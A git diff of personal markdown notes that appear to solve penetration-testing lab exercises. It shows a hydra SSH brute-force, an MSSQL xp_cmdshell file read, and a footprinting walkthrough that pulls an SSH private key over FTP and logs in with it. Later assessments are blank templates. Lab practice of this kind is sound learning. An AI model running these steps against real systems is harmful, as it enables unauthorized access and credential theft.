@@ -337,3 +337,67 @@ hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
 2. EXECUTE("xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'") AT [LOCAL.TEST.LINKED.SRV]
 
 *Result:* Flag
+
+## Footprinting
+### Assessment 1
+*Command:* DNS zone transfer
+
+*Result:* Several DNS and IPs, not usefull for the task
+
+---
+
+*Command:* rustscan -a $TARGET-t 500 -b 1500 -- -A
+
+*Result:*  Open $TARGET:2121
+
+---
+
+*Command:* ftp $TARGET -p 2121
+
+*Result:* Access to ftp server
+
+---
+
+*Command:* ls -la + mget id_rsa
+
+*Result:* Found ssh key
+
+---
+
+*Command:* chmod 600 id_rsa
+
+*Result:* change mode of the file to allow ssh connection
+
+---
+
+*Command:* ssh -i id_rsa ceil@$TARGET
+
+*Result:* Access to target + retrieve flag
+
+
+
+### Assessment 2
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+
+*Command:* 
+
+*Result:* 
+
+---
+### Assessment 3
